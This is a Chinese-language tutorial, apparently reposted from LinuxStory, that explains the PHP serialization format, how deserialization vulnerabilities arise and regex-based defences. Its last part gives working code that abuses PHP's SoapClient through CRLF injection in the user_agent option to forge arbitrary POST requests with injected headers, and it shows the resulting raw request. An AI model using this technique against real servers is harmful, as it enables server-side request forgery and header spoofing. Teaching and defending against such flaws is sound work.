#  深度理解PHP反序列化：漏洞产生原理及其利用技巧

LinuxStory  [ LinuxStory ](javascript:void\(0\);)

**LinuxStory** ![]()

微信号 linuxstory

功能介绍 Linux Story是一个全新的Linux资讯网站，每天为您带来第一手的开源资讯和新鲜温暖的科技故事。

____

___发表于_

收录于合集

序列化和反序列化是一个程序中的常见过程，其中对象被序列化成字符串，仅保留对象中的成员变量而不包括函数方法。这种过程常用于对象的持久化存储。

我们来看一个示例，由于`\0`字符无法复制，所以我们将其替换为URL编码后的`%00`以便于观察：

    
    
    <?php  
    class class1  
    {  
        public $pbl = "pbl_v";  
        protected $prt = "prt_v";  
        private $prv = "prv_v";  
        public function func()  
        {  
            return "func_ret";  
        }  
    }  
      
    $o = new class1();  
    $s = serialize($o);  
    $s = str_replace("\0", '%00', $s);  
    echo $s;  
    

序列化结果如下，可以看到其中仅包含属性和值，而并不包含方法：

    
    
    O:6:"class1":3:{s:3:"pbl";s:5:"pbl_v";s:6:"%00*%00prt";s:5:"prt_v";s:11:"%00class1%00prv";s:5:"prv_v";}  
    

这个序列化后的对象结构的含义为：

    
    
    O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";属性类型:属性值的长度:"属性值";}  
    

## 访问控制修饰符序列化规则

根据不同的访问控制修饰符，序列化后的属性名会有所不同，具体规则如下：

  * `public`（公有的）：属性名

  * `protected`（受保护的）：%00*%00属性名

  * `private`（私有的）：%00类名%00属性名

> `%00`表示`\0`字符。

## PHP序列化属性类型

在PHP序列化中，不同的属性类型有不同的标识：

  * `a` \- array 数组型

  * `b` \- boolean 布尔型

  * `d` \- double 浮点型

  * `i` \- integer 整数型

  * `o` \- common object 共同对象

  * `r` \- object reference 对象引用

  * `s` \- non-escaped binary string 非转义的二进制字符串

  * `S` \- escaped binary string 转义的二进制字符串

  * `C` \- custom object 自定义对象

  * `O` \- class 对象

  * `N` \- null 空

  * `R` \- pointer reference 指针引用

  * `U` \- unicode string Unicode 编码的字符串

## 反序列化漏洞产生原理及其防护

反序列化漏洞产生的主要原因是反序列化过程中的参数用户可控。当服务器接收序列化后的字符串，并且未经过滤地将其中的变量放入一些魔术方法中执行，这就可能产生漏洞。

为了避免此类漏洞的产生，我们可以过滤`/[oc]:\d+:/i`：

    
    
    preg_match('/[oc]:\d+:/i', $a);  
    

或者在数字前加`+`号：

    
    
    str_replace('O:', 'O:+', $a);  
    

## PHP原生类SoapClient的利用

PHP原生类SoapClient是一个用于与Web服务交互的类。它提供了一种轻松访问Web服务的方法，可以在PHP中使用SOAP协议与远程服务器进行通信。

### SoapClient的`__call`方法

当尝试调用未定义的Web服务方法时，`__call`方法会自动被调用，并将方法名和参数传递给Web服务。

例如，执行以下代码：

    
    
    $client = new SoapClient(null, array('uri' => 'uri', 'location' => 'http://127.0.0.1:5555/', 'user_agent' => 'ua'));  
    $client->not_exists_function();  
    

会产生以下的调用链：`SoapClient-&gt;__call('not_exists_func...',
Array)-&gt;SoapClient-&gt;__doRequest('&lt;?xml version=&quot;...&#039;,
&#039;http://127.0.0....&#039;, &#039;uri#not_exists_...&#039;, 1, 0)`。

### 利用SoapClient执行任意POST请求

在SoapClient中，`SOAPAction`和`User-
Agent`可被控制，这就使得我们可以注入`CRLF`来控制POST请求的header或者更改`Content-
Type`的值。例如，我们可以在下面的代码中对`UA`进行`CRLF`注入：

    
    
    <?php  
    $target = 'http://127.0.0.1:5555';  
    $post_string = 'name=value';  
    $headers = array(  
        'X-Forwarded-For: 127.0.0.1, 127.0.0.1',  
        'Cookie: name=value'  
    );  
      
    $client = new SoapClient(null, array(  
        'uri' => 'uri',  
        'location' => 'http://127.0.0.1:5555/',  
        'user_agent' => 'p0ise'."\r\n".  
                        'Content-Type: application/x-www-form-urlencoded'."\r\n".  
                        join("\r\n", $headers) . "\r\n".  
                        'Content-Length: ' . (string)strlen($post_string) . "\r\n\r\n" .  
                        $post_string  
        )  
    );  
      
    $client->not_exists_function();  
    

此代码会产生以下的报文：

    
    
    POST / HTTP/1.1  
    Host: 127.0.0.1:5555  
    Connection: Keep-Alive  
    User-Agent: p0ise  
    Content-Type: application/x-www-form-urlencoded  
    X-Forwarded-For: 127.0.0.1, 127.0.0.1  
    Cookie: name=value  
    Content-Length: 13  
      
    name=value  
    Content-Type: text/xml; charset=utf-8  
    SOAPAction: "uri#not_exists_function"  
    Content-Length: 382  
      
    <?xml version="1.0" encoding="UTF-8"?>  
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="uri" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:not_exists_function/></SOAP-ENV:Body></SOAP-ENV:Envelope>  
    

## 总结

通过以上解释，我们可以看出，理解PHP序列化和反序列化的原理及其相关漏洞的产生和防护是非常重要的，因为它涉及到数据的持久化存储和安全性。同时，也说明了如何利用PHP原生类SoapClient进行交互，并可能产生的安全风险。在编写代码时，我们需要特别注意对这些可能产生的漏洞进行预防，以确保数据的安全。

* * *

本文链接: https://linuxstory.org/in-depth-understanding-of-php-deserialization-
the-principle-of-vulnerability-generation-and-its-utilization-skills

LinuxStory 原创教程，转载请注明出处，否则必究相关责任。

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

